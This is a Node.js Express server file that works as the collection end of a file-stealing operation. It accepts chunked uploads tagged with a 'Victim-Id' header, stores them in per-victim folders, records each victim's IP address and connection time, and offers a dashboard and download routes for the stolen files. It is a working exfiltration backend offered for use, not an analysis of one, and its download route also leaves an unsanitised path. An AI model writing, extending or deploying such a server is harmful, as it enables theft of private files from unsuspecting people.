const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080; // Railway or fallback port

// CORS settings
const corsOptions = {
    origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
    credentials: true,
};
app.use(cors(corsOptions));

// Debug request logging
app.use((req, res, next) => {
    console.log('📥 Request:', req.method, req.url, 'Headers:', req.headers);
    next();
});

app.options('/upload', (req, res) => {
    res.header('Access-Control-Allow-Origin', corsOptions.origin.join(', '));
    res.header('Access-Control-Allow-Methods', corsOptions.methods.join(', '));
    res.header('Access-Control-Allow-Headers', corsOptions.allowedHeaders.join(', '));
    res.header('Access-Control-Allow-Credentials', 'true');
    res.status(204).end();
});

app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));
app.get('/dashboard/', (req, res) => res.sendFile(path.join(__dirname, 'dashboard', 'index.html')));

app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};
const connectedDevices = {}; // Tracks connection time, files, upload times

const chunkTracker = new Map();

async function checkAndSendEmail(victimId, filename, victimFolder) {
    const filesInFolder = fs.readdirSync(victimFolder);
    if (filesInFolder.length === victimTotalFiles[victimId]) {
        console.log(`✅ All files received for victim ${victimId}`);

        victimFiles[victimId] = filesInFolder.map((file) => {
            const filePath = path.join(victimFolder, file);
            const stats = fs.statSync(filePath);
            return { name: file, type: path.extname(file).substring(1), size: stats.size };
        });

        // Calculate and log per-file upload time
        if (connectedDevices[victimId]?.fileTimers?.[filename]) {
            const uploadDurationMs = Date.now() - connectedDevices[victimId].fileTimers[filename];
            console.log(`⏱️ Transfer time for file ${filename}: ${(uploadDurationMs / 1000).toFixed(2)} seconds`);

            // Optionally accumulate total time (all files combined)
            connectedDevices[victimId].totalUploadDuration = (connectedDevices[victimId].totalUploadDuration || 0) + uploadDurationMs;

            // Clear file-specific timer after processing
            delete connectedDevices[victimId].fileTimers[filename];
        }

        // Optional: log total time for all files
        if (filesInFolder.length === victimTotalFiles[victimId] && connectedDevices[victimId]?.totalUploadDuration) {
            console.log(`📊 Total transfer time for all files (victim ${victimId}): ${(connectedDevices[victimId].totalUploadDuration / 1000).toFixed(2)} seconds`);
        }
    }
}

app.post('/upload', (req, res) => {
    try {
        const filename = decodeURIComponent(req.headers['filename']);
        const victimId = decodeURIComponent(req.headers['victim-id']);
        const chunkIndex = parseInt(req.headers['chunk-index']);
        const totalChunks = parseInt(req.headers['total-chunks']);
        const ip = req.ip;

        if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
            return res.status(400).json({ error: 'Missing or invalid headers' });
        }

        const chunkId = `${victimId}-${filename}-${chunkIndex}`;

        if (!chunkTracker.has(chunkId)) chunkTracker.set(chunkId, new Set());
        if (chunkTracker.get(chunkId).has(chunkIndex)) {
            console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
            return res.status(200).json({ message: 'Duplicate chunk skipped' });
        }
        chunkTracker.get(chunkId).add(chunkIndex);

        if (!connectedDevices[victimId]) {
            connectedDevices[victimId] = {
                ip,
                connectionTime: new Date(),
                filesTransferred: 0,
                fileList: [],
                fileTimers: {}, // New: Tracks individual file timers
            };
        }

        if (chunkIndex === 0 && !connectedDevices[victimId].fileTimers[filename]) {
            connectedDevices[victimId].fileTimers[filename] = Date.now();
        }

        if (!victimFolders[victimId]) {
            const timestamp = new Date().toISOString().replace(/:/g, '-');
            victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
            fs.mkdirSync(victimFolders[victimId], { recursive: true });
            victimFileCounts[victimId] = 0;
            victimTotalFiles[victimId] = totalChunks;
        }

        const victimFolder = victimFolders[victimId];
        const filePath = path.join(victimFolder, filename);

        fs.appendFile(filePath, req.body, (err) => {
            if (err) {
                console.error(`❌ Error writing file:`, err);
                return res.status(500).json({ error: 'Error saving file' });
            }

            console.log(`✅ Chunk ${chunkIndex + 1}/${totalChunks} received for ${filename}`);
            victimFileCounts[victimId] += 1;
            connectedDevices[victimId].filesTransferred += 1;

            if (!connectedDevices[victimId].fileList.includes(filename)) {
                connectedDevices[victimId].fileList.push(filename);
            }

            if (victimFileCounts[victimId] === totalChunks) {
                console.log(`✅ File upload complete: ${filename}`);
                checkAndSendEmail(victimId, filename, victimFolder);
            }

            res.status(200).json({ message: 'Chunk received successfully' });
        });
    } catch (error) {
        console.error(`❌ Error handling upload:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.get('/dashboard-data', (req, res) => {
    res.json(connectedDevices);
});

app.get('/download/:victimId/:filename', (req, res) => {
    try {
        const { victimId, filename } = req.params;

        if (!victimFolders[victimId]) {
            return res.status(404).json({ error: 'Victim folder not found' });
        }

        const victimFolder = victimFolders[victimId];
        const filePath = path.join(victimFolder, filename);

        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }

        res.download(filePath, filename, (err) => {
            if (err) {
                console.error(`❌ Error sending file:`, err);
                res.status(500).json({ error: 'Error sending file' });
            }
        });
    } catch (error) {
        console.error(`❌ Error in download route:`, error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
